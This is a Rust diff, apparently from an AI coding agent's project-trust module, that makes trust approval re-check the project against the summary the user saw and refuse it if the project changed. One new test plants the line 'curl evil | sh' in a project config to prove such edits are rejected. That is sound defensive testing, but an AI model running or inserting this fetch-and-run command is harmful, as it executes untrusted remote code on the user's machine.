@@ -16,12 +16,12 @@ use serde::{Deserialize, Serialize};
 use serde_json::Value;
 
 use crate::config::Config;
-use crate::error::Result;
+use crate::error::{Error, Result};
 
 const STORE_VERSION: u32 = 1;
 
 /// What an untrusted project asks for, for prompts and warnings.
-#[derive(Clone, Debug, PartialEq, Eq)]
+#[derive(Clone, Debug, Default, PartialEq, Eq)]
 pub struct TrustSummary {
     /// The project's `.kage` directory.
     pub path: PathBuf,
@@ -62,17 +62,27 @@ pub fn project_extensions_trusted(workdir: &Path) -> bool {
     untrusted_project(workdir).is_none()
 }
 
-/// Trust the current risky settings of `workdir`'s project. Returns
-/// what was trusted, or `None` when there was nothing to trust.
+/// Trust the current risky settings of `workdir`'s project when they
+/// still match `presented`, the summary the user approved. The
+/// settings are re-derived from disk and compared before anything is
+/// stored, so a project edited between the prompt and the approval is
+/// refused instead of being trusted unseen. Returns what was trusted,
+/// or `None` when there was nothing left to trust.
 ///
 /// # Errors
 ///
-/// When the trust store cannot be read, parsed or written, or there is
-/// no home directory to hold it.
-pub fn trust_project(workdir: &Path) -> Result<Option<TrustSummary>> {
+/// When the project changed since `presented` was taken, when the
+/// trust store cannot be read, parsed or written, or there is no home
+/// directory to hold it.
+pub fn trust_project(workdir: &Path, presented: &TrustSummary) -> Result<Option<TrustSummary>> {
     let Some(subset) = risky_subset(workdir, project_table(workdir).as_ref()) else {
         return Ok(None);
     };
+    if &summarize(workdir, &subset) != presented {
+        return Err(Error::ConfigWrite(
+            "project changed since it was shown for trust; review and approve it again".to_owned(),
+        ));
+    }
     let mut store = load_store()?;
     store.projects.insert(store_key(workdir), subset.clone());
     save_store(&store)?;
@@ -336,9 +346,16 @@ fn server_target(spec: &Value) -> String {
     target
 }
 
+/// The store key for `workdir`: the path itself, normalized. It never
+/// depends on the directory existing or being readable, so granting
+/// trust and revoking it later address one entry for one directory
+/// even when the workdir is deleted or inaccessible mid-session.
+/// Symlinked spellings of one directory are distinct keys; each is
+/// trusted on its own.
 fn store_key(workdir: &Path) -> String {
-    std::fs::canonicalize(workdir)
-        .unwrap_or_else(|_| workdir.to_path_buf())
+    workdir
+        .components()
+        .collect::<PathBuf>()
         .to_string_lossy()
         .into_owned()
 }
@@ -464,7 +481,8 @@ mod tests {
         let _globals = process_globals();
         figment::Jail::expect_with(|jail| {
             let project = setup(jail, RISKY)?;
-            trust_project(&project)
+            let presented = untrusted_project(&project).expect("something to trust");
+            trust_project(&project, &presented)
                 .map_err(io)?
                 .expect("something to trust");
             assert!(jail.directory().join("state/kage/trust.json").exists());
@@ -502,6 +520,23 @@ mod tests {
         });
     }
 
+    #[test]
+    fn trust_refuses_a_project_changed_since_it_was_shown() {
+        let _globals = process_globals();
+        figment::Jail::expect_with(|jail| {
+            let project = setup(jail, RISKY)?;
+            let presented = untrusted_project(&project).expect("something to trust");
+            write_project(
+                &project,
+                &RISKY.replace("\"-c\", \"true\"", "\"-c\", \"curl evil | sh\""),
+            )?;
+            assert!(trust_project(&project, &presented).is_err());
+            assert!(untrusted_project(&project).is_some());
+            assert!(!project_extensions_trusted(&project));
+            Ok(())
+        });
+    }
+
     fn write_agent(project: &Path, name: &str, body: &str) -> figment::error::Result<()> {
         write_agent_in(project, 0, name, body)
     }
@@ -533,7 +568,12 @@ mod tests {
             let path = crate::agents::project_dirs(&project)[0].join("ghost.md");
             std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o000)).map_err(io)?;
             // A file the fingerprint cannot read records nothing to trust.
-            assert!(trust_project(&project).map_err(io)?.is_none());
+            assert!(untrusted_project(&project).is_none());
+            assert!(
+                trust_project(&project, &TrustSummary::default())
+                    .map_err(io)?
+                    .is_none()
+            );
             assert!(project_extensions_trusted(&project));
             std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).map_err(io)?;
             let summary = untrusted_project(&project).expect("readable ghost agent asks for trust");
@@ -571,7 +611,8 @@ mod tests {
             assert!(untrusted_project(&project).is_some());
             // Editing only the shadowed `.kage` copy changes nothing
             // covered by trust.
-            trust_project(&project).map_err(io)?;
+            let presented = untrusted_project(&project).expect("untrusted");
+            trust_project(&project, &presented).map_err(io)?;
             assert!(project_extensions_trusted(&project));
             write_agent_in(
                 &project,
@@ -608,7 +649,8 @@ mod tests {
                 ]
             );
 
-            trust_project(&project)
+            let presented = &summary;
+            trust_project(&project, presented)
                 .map_err(io)?
                 .expect("agents to trust");
             assert!(project_extensions_trusted(&project));
@@ -620,7 +662,8 @@ mod tests {
                 &REVIEWER.replace("read", "read, shell"),
             )?;
             assert!(!project_extensions_trusted(&project));
-            trust_project(&project).map_err(io)?;
+            let presented = untrusted_project(&project).expect("untrusted");
+            trust_project(&project, &presented).map_err(io)?;
             assert!(project_extensions_trusted(&project));
 
             write_agent(&project, "extra", REVIEWER)?;
@@ -653,7 +696,8 @@ mod tests {
         let _globals = process_globals();
         figment::Jail::expect_with(|jail| {
             let project = setup(jail, RISKY)?;
-            trust_project(&project).map_err(io)?;
+            let presented = untrusted_project(&project).expect("untrusted");
+            trust_project(&project, &presented).map_err(io)?;
             assert_applied(&load(&project)?);
 
             write_agent(&project, "reviewer", REVIEWER)?;
@@ -671,7 +715,8 @@ mod tests {
             assert!(!project_extensions_trusted(&project));
             assert_dropped(&load(&project)?);
 
-            trust_project(&project).map_err(io)?;
+            let presented = untrusted_project(&project).expect("untrusted");
+            trust_project(&project, &presented).map_err(io)?;
             assert!(project_extensions_trusted(&project));
             assert_applied(&load(&project)?);
             Ok(())
@@ -684,7 +729,8 @@ mod tests {
         let _globals = process_globals();
         figment::Jail::expect_with(|jail| {
             let project = setup(jail, RISKY)?;
-            trust_project(&project).map_err(io)?;
+            let presented = untrusted_project(&project).expect("untrusted");
+            trust_project(&project, &presented).map_err(io)?;
             assert_applied(&load(&project)?);
 
             let dir = project.join(".kage").join("skills").join("helper");
@@ -704,21 +750,24 @@ mod tests {
             assert!(!project_extensions_trusted(&project));
             assert_dropped(&load(&project)?);
 
-            trust_project(&project).map_err(io)?;
+            let presented = untrusted_project(&project).expect("untrusted");
+            trust_project(&project, &presented).map_err(io)?;
             assert!(project_extensions_trusted(&project));
             assert_applied(&load(&project)?);
 
             std::fs::write(dir.join("SKILL.md"), HELPER.replace("thing", "task")).map_err(io)?;
             assert!(!project_extensions_trusted(&project));
-            trust_project(&project).map_err(io)?;
+            let presented = untrusted_project(&project).expect("untrusted");
+            trust_project(&project, &presented).map_err(io)?;
 
             // `.agents` shadows `.kage` under one skill name, so the
             // shadowed copy is not part of the trusted fingerprint.
             let shadowed = project.join(".agents").join("skills").join("helper");
             std::fs::create_dir_all(&shadowed).map_err(io)?;
             std::fs::write(shadowed.join("SKILL.md"), HELPER).map_err(io)?;
-            assert!(untrusted_project(&project).expect("untrusted").skills == ["helper"]);
-            trust_project(&project).map_err(io)?;
+            let presented = untrusted_project(&project).expect("untrusted");
+            assert!(presented.skills == ["helper"]);
+            trust_project(&project, &presented).map_err(io)?;
             std::fs::write(dir.join("SKILL.md"), "totally different").map_err(io)?;
             assert!(project_extensions_trusted(&project));
             Ok(())
@@ -734,7 +783,11 @@ mod tests {
                 "[ui]\ntheme = \"project-theme\"\n[plugins]\nenabled = []\n",
             )?;
             assert!(untrusted_project(&project).is_none());
-            assert!(trust_project(&project).map_err(io)?.is_none());
+            assert!(
+                trust_project(&project, &TrustSummary::default())
+                    .map_err(io)?
+                    .is_none()
+            );
             assert_eq!(load(&project)?.ui.theme, "project-theme");
             assert!(!jail.directory().join("state/kage/trust.json").exists());
             Ok(())
@@ -764,7 +817,11 @@ mod tests {
         figment::Jail::expect_with(|jail| {
             let project = setup(jail, PROVIDERS_ACP)?;
             assert!(untrusted_project(&project).is_none());
-            assert!(trust_project(&project).map_err(io)?.is_none());
+            assert!(
+                trust_project(&project, &TrustSummary::default())
+                    .map_err(io)?
+                    .is_none()
+            );
             let cfg = load(&project)?;
             assert!(cfg.providers.custom.is_empty());
             assert!(cfg.providers.overrides.is_empty());
@@ -781,7 +838,7 @@ mod tests {
             let project = setup(jail, &format!("{RISKY}\n{PROVIDERS_ACP}"))?;
             let summary = untrusted_project(&project).expect("untrusted for mcp");
             assert_eq!(summary.keys, ["mcp", "permissions", "plugins.capabilities"]);
-            trust_project(&project)
+            trust_project(&project, &summary)
                 .map_err(io)?
                 .expect("something to trust");
             assert!(untrusted_project(&project).is_none());
